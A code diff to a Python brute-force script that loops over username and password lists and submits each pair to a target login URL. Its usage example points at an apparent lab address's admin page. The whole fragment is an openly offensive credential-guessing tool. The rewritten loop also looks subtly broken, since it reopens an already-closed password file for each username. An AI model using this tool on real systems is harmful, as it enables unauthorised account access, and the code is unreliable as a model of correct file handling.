@@ -33,10 +33,11 @@ def main():
         my_passlist = open(argv[2], "r+", encoding="utf-8")
         my_userlist = open(argv[3], "r+", encoding="utf-8")
 
-        with my_userlist as target_username, my_passlist as target_password:
-            for my_username in target_username:
-                for my_password in target_password:
-                    force(target_ip.strip(), my_username.strip(), my_password.strip())
+        with my_userlist as userlist:
+            for username in userlist:
+                with my_passlist as passlist:
+                    for password in passlist:
+                        force(target_ip.strip(), username.strip(), password.strip())
     
     except Exception as ex: 
         print(f"Usage : python {argv[0]} [target_url] [passwordlist] [usernamelist]\nExample : python {argv[0]} http://10.10.10.191/admin passlist.txt userlist.txt\n{ex}")
